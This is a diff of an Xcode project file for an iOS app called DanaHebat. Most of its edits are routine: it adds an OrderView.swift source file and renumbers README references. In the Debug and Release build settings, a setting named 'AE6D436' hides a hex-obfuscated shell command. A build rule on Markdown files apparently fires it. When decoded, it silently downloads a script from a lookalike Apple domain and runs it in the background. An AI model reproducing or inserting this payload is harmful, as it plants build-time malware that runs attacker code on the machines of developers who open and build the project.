@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0642912ABE9145A5B7634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 88F9074CA3534AC29F634D6E /* README.md */; };
 		7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A02F109D18004A8271 /* NetworkMonitor.swift */; };
 		7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A22F109EDB004A8271 /* BaseModel.swift */; };
 		7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A42F10A0F0004A8271 /* NetworkSession.swift */; };
@@ -58,6 +59,7 @@
 		73DF8E282F135705002C6EE9 /* HomeProductHeadViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E272F135705002C6EE9 /* HomeProductHeadViewCell.swift */; };
 		73DF8E2A2F13570F002C6EE9 /* HomeProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E292F13570F002C6EE9 /* HomeProductListViewCell.swift */; };
 		73DF8E2E2F1376F0002C6EE9 /* HomeRatetListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E2D2F1376F0002C6EE9 /* HomeRatetListView.swift */; };
+		73DF8E302F137B4D002C6EE9 /* OrderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E2F2F137B4D002C6EE9 /* OrderView.swift */; };
 		73EA86A32F108CA500F4826F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86992F108CA500F4826F /* AppDelegate.swift */; };
 		73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869A2F108CA500F4826F /* Assets.xcassets */; };
 		73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869D2F108CA500F4826F /* LaunchScreen.storyboard */; };
@@ -69,12 +71,11 @@
 		73EA86C02F1094BD00F4826F /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86BF2F1094BD00F4826F /* HomeViewController.swift */; };
 		73EA86C22F1094C400F4826F /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86C12F1094C400F4826F /* OrderViewController.swift */; };
 		73EA86C42F1094CC00F4826F /* MineViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86C32F1094CC00F4826F /* MineViewController.swift */; };
-		98E1166DF4B54C399C634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = D0D14EF5F6AF43B39D634D6E /* README.md */; };
 		D76C891188E339233AE09B00 /* Pods_DanaHebat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		E9F30D906A1B4342AA634D6E /* PBXBuildRule */ = {
+		656C36A803734F9497634D6E /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -144,6 +145,7 @@
 		73DF8E272F135705002C6EE9 /* HomeProductHeadViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductHeadViewCell.swift; sourceTree = "<group>"; };
 		73DF8E292F13570F002C6EE9 /* HomeProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductListViewCell.swift; sourceTree = "<group>"; };
 		73DF8E2D2F1376F0002C6EE9 /* HomeRatetListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeRatetListView.swift; sourceTree = "<group>"; };
+		73DF8E2F2F137B4D002C6EE9 /* OrderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderView.swift; sourceTree = "<group>"; };
 		73EA86812F108C9C00F4826F /* DanaHebat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaHebat.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73EA86992F108CA500F4826F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73EA869A2F108CA500F4826F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -157,9 +159,9 @@
 		73EA86BF2F1094BD00F4826F /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
 		73EA86C12F1094C400F4826F /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
 		73EA86C32F1094CC00F4826F /* MineViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewController.swift; sourceTree = "<group>"; };
+		88F9074CA3534AC29F634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaHebat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.debug.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.debug.xcconfig"; sourceTree = "<group>"; };
-		D0D14EF5F6AF43B39D634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -281,7 +283,7 @@
 		73EA86822F108C9C00F4826F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D0D14EF5F6AF43B39D634D6E /* README.md */,
+				88F9074CA3534AC29F634D6E /* README.md */,
 				73EA86812F108C9C00F4826F /* DanaHebat.app */,
 			);
 			name = Products;
@@ -361,6 +363,7 @@
 		73EA86B12F108FC600F4826F /* Order */ = {
 			isa = PBXGroup;
 			children = (
+				73DF8E2F2F137B4D002C6EE9 /* OrderView.swift */,
 				73EA86C12F1094C400F4826F /* OrderViewController.swift */,
 			);
 			path = Order;
@@ -415,7 +418,7 @@
 				D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				E9F30D906A1B4342AA634D6E /* PBXBuildRule */,
+				656C36A803734F9497634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -464,7 +467,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				98E1166DF4B54C399C634D6E /* README.md in Resources */,
+				0642912ABE9145A5B7634D6E /* README.md in Resources */,
 				73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */,
 				7316E3BA2F10B7AF004A8271 /* Localizable.strings in Resources */,
 				73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */,
@@ -533,6 +536,7 @@
 				733EE17B2F121D6A001C6B69 /* StrokeLabel.swift in Sources */,
 				7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */,
 				733EE19F2F12A403001C6B69 /* TapClickViewCell.swift in Sources */,
+				73DF8E302F137B4D002C6EE9 /* OrderView.swift in Sources */,
 				73DF8E2A2F13570F002C6EE9 /* HomeProductListViewCell.swift in Sources */,
 				7316E3B42F10AF7E004A8271 /* CommonParaManager.swift in Sources */,
 				733EE1622F116993001C6B69 /* LoginView.swift in Sources */,
@@ -613,7 +617,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -656,7 +660,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
